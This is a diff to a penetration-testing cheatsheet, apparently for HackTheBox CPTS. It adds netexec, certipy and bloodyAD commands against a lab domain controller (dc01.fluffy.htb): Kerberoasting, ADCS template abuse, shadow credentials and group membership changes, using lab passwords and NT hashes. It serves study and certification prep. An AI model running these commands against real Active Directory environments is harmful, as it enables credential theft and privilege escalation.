@@ -50,8 +50,12 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [Login Brute Forcing](#login-brute-forcing)
     - [Hydra](#hydra)
 - [SQLMap](#sqlmap)
+- 
 - [bloodhound](#bloodhound)
-- [nxc](#nxc)
+- [netexec](#netexec)
+- [certipy](#certipy)
+- [bloodyAD](#bloodyAD)
+- 
 - [Useful Resources](#useful-resources)
 
 
@@ -773,14 +777,53 @@ sudo neo4j console
 bloodhound
 
 ```
-## nxc
+## netexec
 
 ```
+# auth with smb 
+netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' 
+
+# auth with winrm  
+netexec winrm  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' 
+
+# auth with ldap  
+netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' 
+
 # list shares 
-nxc smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
+netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --shares
+
+# list shares 
+netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
 
 # Kerberoasting 
-nxc ldap   dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --kerberoasting -
+netexec ldap   dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --kerberoasting -
+
+# run ADCS modules  
+netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -M adcs
+
+```
+## certipy
+
+```
+# get info of account ca_svc
+certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
+
+# get a list of all the templates    ( hash or clear text)
+certipy find -u j.fleischman@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8   -stdout
+
+# find templates vuln 
+certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout
+
+# Shadow Credential  (  p.agila need have GenericWrite over winrm_svc , can targeted Kerberoast (give the user a SPN, get a hash, and try to break it to get their password))
+certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
+
+```
+## bloodyAD
+
+```
+# adding the p.agila user to the Service Accounts group
+bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
+
 
 
 
